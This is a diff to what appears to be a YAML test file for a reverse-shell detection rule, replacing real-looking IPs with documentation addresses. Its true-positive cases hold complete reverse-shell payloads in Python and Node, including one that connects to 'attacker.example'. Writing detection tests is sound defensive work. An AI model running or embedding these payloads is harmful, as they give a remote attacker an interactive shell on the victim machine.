@@ -148,7 +148,7 @@ response:
 confidence: 85
 test_cases:
   true_positives:
-    - input: "import socket,os,subprocess\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect((\"185.62.57.14\",4444))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nsubprocess.call([\"/bin/sh\",\"-i\"])"
+    - input: "import socket,os,subprocess\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect((\"203.0.113.14\",4444))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nsubprocess.call([\"/bin/sh\",\"-i\"])"
       expected: triggered
       description: "Canonical python reverse shell as package source (MAL-2025-191647 shape)"
     - input: "import socket,os,pty\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect((\"10.11.12.13\",9001))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\npty.spawn(\"/bin/bash\")"
@@ -160,7 +160,7 @@ test_cases:
     - input: "const net=require('net');\nconst sh=require('child_process').spawn('/bin/bash');\nnet.connect(1337,'attacker.example',function(){this.pipe(sh.stdin);sh.stdout.pipe(this);});"
       expected: triggered
       description: "Node net.connect form, shell spawned with no argument list"
-    - input: "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect((\"1.2.3.4\",8080))\nos.dup2(s.fileno(),0)\nos.execve(\"/bin/sh\",[\"/bin/sh\"],{})"
+    - input: "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect((\"192.0.2.4\",8080))\nos.dup2(s.fileno(),0)\nos.execve(\"/bin/sh\",[\"/bin/sh\"],{})"
       expected: triggered
       description: "exec-family handover after descriptor rebinding"
   true_negatives:
